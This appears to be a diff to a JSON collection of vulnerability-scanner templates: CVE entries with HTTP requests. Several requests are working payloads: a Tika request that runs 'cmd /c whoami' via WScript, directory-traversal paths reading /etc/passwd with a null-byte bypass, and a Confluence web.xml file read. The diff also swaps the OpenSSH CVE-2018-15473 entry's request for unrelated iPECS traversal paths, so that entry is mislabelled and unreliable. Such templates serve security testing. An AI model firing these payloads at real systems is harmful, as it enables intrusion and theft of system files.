@@ -5869,11 +5869,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -6005,6 +6005,22 @@
       ]
     },
     {
+      "id": "CVE-2018-15138",
+      "info": {
+        "name": "LG-Ericsson iPECS NMS 30M Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ipecs-cm/download?filename=../../../../../../../../../../etc/passwd&filepath=/home/wms/www/data",
+            "{{BaseURL}}/ipecs-cm/download?filename=jre-6u13-windows-i586-p.exe&filepath=../../../../../../../../../../etc/passwd%00.jpg"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-15473",
       "info": {
         "name": "OpenSSH Username Enumeration <= v7.7",
@@ -6014,7 +6030,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152"
+            "{{BaseURL}}/ipecs-cm/download?filename=../../../../../../../../../../etc/passwd&filepath=/home/wms/www/data",
+            "{{BaseURL}}/ipecs-cm/download?filename=jre-6u13-windows-i586-p.exe&filepath=../../../../../../../../../../etc/passwd%00.jpg"
           ]
         }
       ]
@@ -12297,6 +12314,21 @@
       ]
     },
     {
+      "id": "CVE-2021-26085",
+      "info": {
+        "name": "Confluence Pre-Authorization Arbitrary File Read in /s/ endpoint - CVE-2021-26085",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/s/123cfx/_/;/WEB-INF/web.xml"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-26086",
       "info": {
         "name": "Jira Limited Local File Read",
@@ -14301,7 +14333,7 @@
       "id": "CVE-2021-45092",
       "info": {
         "name": "Thinfinity Iframe Injection",
-        "severity": "medium"
+        "severity": "critical"
       },
       "requests": [
         {
